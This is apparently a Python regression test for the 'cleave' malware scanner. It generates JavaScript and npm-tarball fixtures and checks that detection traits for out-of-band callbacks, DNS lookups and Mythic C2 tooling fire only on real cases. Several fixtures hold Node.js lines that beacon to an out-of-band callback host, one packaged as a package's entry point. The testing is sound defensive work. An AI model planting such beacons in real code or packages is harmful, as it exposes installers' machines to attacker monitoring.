#!/usr/bin/env python3
"""Check endpoint findings against API aliases, inert text and unrelated calls."""
import argparse
import io
import json
from pathlib import Path
import re
import subprocess
import tarfile
import tempfile


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--cleave', default='../cleave/target/release/cleave')
    args = parser.parse_args()
    root = Path(__file__).resolve().parents[2]
    cleave = str(Path(args.cleave).resolve())
    url = 'https://proof.oast.fun/'
    original = f'const http=require("https");http.get("{url}").on("error",()=>{{}});'
    cases = {
        'get-original.js': original,
        'get-var.js': f'var transport=require("node:http");const target="{url}";transport.get(target);',
        'get-let.js': f'let transport=require("node:https");transport.get("{url}",()=>{{}});',
        'get-inline.js': f'require("https").get("{url}");',
        'get-alias.js': f'const transport=require("https");const alias=transport;alias.get("{url}");',
        'get-port.js': 'const transport=require("https");transport.get("https://proof.oast.fun:8443?probe=1");',
        'get-fake.js': f'const client={{get(){{}}}};client.get("{url}");',
        'get-reassigned.js': f'let client=require("https");client={{get(){{}}}};client.get("{url}");',
        'get-wrong-module.js': f'const client=require("cache");client.get("{url}");',
        'get-unused-collector.js': f'const client=require("https");const unused="{url}";client.get("https://example.invalid/");',
        'get-host-suffix.js': 'const client=require("https");client.get("https://proof.oast.fun"+".example.invalid/");',
        'get-deferred.js': f'const client=require("https");function run(){{client.get("{url}");}}',
        'get-comment.js': '// ' + original,
        'get-quoted.js': 'const source=' + json.dumps(original) + ';',
        'dns-resolve.js': 'const resolver=require("node:dns");const domain="example.invalid";resolver.resolve(domain,()=>{});',
        'dns-inline.js': 'const domain="example.invalid";require("node:dns").resolve(domain,()=>{});',
        'dns-lookup.js': 'const resolver=require("dns");resolver.lookup("example.invalid",()=>{});',
        'dns-long-gap.js': 'const resolver=require("dns");' + '// padding\n' * 100 + 'resolver.resolve("example.invalid",()=>{});',
        'dns-unused-import.js': 'const dns=require("dns");const cache={resolve(){}};const domain="example.invalid";cache.resolve(domain);',
        'dns-wrong-module.js': 'const dns=require("cache");dns.resolve("example.invalid");',
        'dns-reassigned.js': 'let dns=require("dns");dns={resolve(){}};dns.resolve("example.invalid");',
        'dns-quoted.js': 'const source=' + json.dumps('const dns=require("dns");dns.resolve("example.invalid");') + ';',
        'dns-comment.js': '// const dns=require("dns");dns.resolve("example.invalid");',
    }
    fixtures = root / 'testdata/hostile/generated/javascript-endpoint-review'
    for name, fixture in [('callback', 'mythic-callback-config.js'), ('builder', 'mythic-payload-builder.js')]:
        source = (fixtures / fixture).read_text()
        aliased = re.sub(r'\bgql\b', 'schemaTag', source).replace('{schemaTag,', '{gql as schemaTag,')
        cases[f'{name}-alias.js'] = aliased
        cases[f'{name}-fake-alias.js'] = aliased.replace("from '@apollo/client'", "from './view-utils'")
        cases[f'{name}-quoted.js'] = 'const source=' + json.dumps(aliased) + ';'

    with tempfile.TemporaryDirectory(prefix='javascript-improve-') as directory:
        stage = Path(directory)
        for name, source in cases.items():
            (stage / name).write_text(source + '\n')
        packaged = ['get-original.js', 'get-var.js', 'get-inline.js', 'get-fake.js', 'get-unused-collector.js', 'get-deferred.js']
        for name in packaged:
            manifest = json.dumps({'name': 'execution-probe-control', 'version': '1.0.0', 'main': 'index.js'})
            with tarfile.open(stage / name.replace('.js', '.tgz'), 'w:gz') as archive:
                for member, text in [('package.json', manifest), ('index.js', cases[name])]:
                    data = text.encode()
                    info = tarfile.TarInfo('package/' + member)
                    info.size = len(data)
                    archive.addfile(info, io.BytesIO(data))
        result = subprocess.run([cleave, '--traits-dir', str(root), '--format', 'jsonl', *map(str, sorted(stage.iterdir()))], capture_output=True, text=True, check=True)
        assert 'skipped' not in result.stderr.lower(), result.stderr
        reports = [json.loads(line)['files'][0] for line in result.stdout.split('\n') if line]
        files = {Path(r['path']).name: r for r in reports}

        def ids(name, level=None):
            return {t['id'] for t in files[name].get('traits', []) if level is None or t['crit'] == level}

        oob = 'objectives/exfiltration/oob/callback::node-module-body-oob-get'
        get = 'micro-behaviors/communications/http/request/get::node-http-client-get'
        positives = ['get-original.js', 'get-var.js', 'get-let.js', 'get-inline.js', 'get-alias.js', 'get-port.js']
        for name in positives:
            assert oob in ids(name, 4), (name, ids(name))
            assert get in ids(name, 3), (name, ids(name))
        for name in [n for n in cases if n.startswith('get-') and n not in positives]:
            assert oob not in ids(name), (name, ids(name))
        for name in ['get-fake.js', 'get-reassigned.js', 'get-wrong-module.js', 'get-quoted.js', 'get-comment.js']:
            assert get not in ids(name), (name, ids(name))
        published = 'objectives/exfiltration/oob/callback::published-tiny-node-entry-oob-beacon'
        for name in packaged:
            actual = name.replace('.js', '.tgz')
            assert (published in ids(actual, 5)) == (name in positives), (actual, ids(actual, 5))

        dns = 'micro-behaviors/communications/dns/resolver::'
        for name in ['dns-resolve.js', 'dns-inline.js', 'dns-long-gap.js']:
            assert dns + 'dns-require-bound-resolve' in ids(name, 3), (name, ids(name))
        assert dns + 'dns-require-bound-lookup' in ids('dns-lookup.js', 3)
        assert dns + 'dns-bound-resolve-variable-name' in ids('dns-resolve.js', 3)
        for name in ['dns-unused-import.js', 'dns-wrong-module.js', 'dns-reassigned.js', 'dns-quoted.js', 'dns-comment.js']:
            assert not {dns + 'dns-require-bound-resolve', dns + 'dns-bound-resolve-variable-name'} & ids(name), (name, ids(name))
        for name, trait in [('callback', 'operator-cross-server-callback-importer'), ('builder', 'operator-payload-build-interface')]:
            identity = 'well-known/tool/offensive/mythic::' + trait
            assert identity in ids(f'{name}-alias.js', 5), (name, ids(f'{name}-alias.js'))
            for suffix in ['fake-alias', 'quoted']:
                assert identity not in ids(f'{name}-{suffix}.js'), (name, suffix)
    print(f'JavaScript improvement regressions passed: {len(cases) + len(packaged)} controls; no sample code executed')


if __name__ == '__main__':
    main()
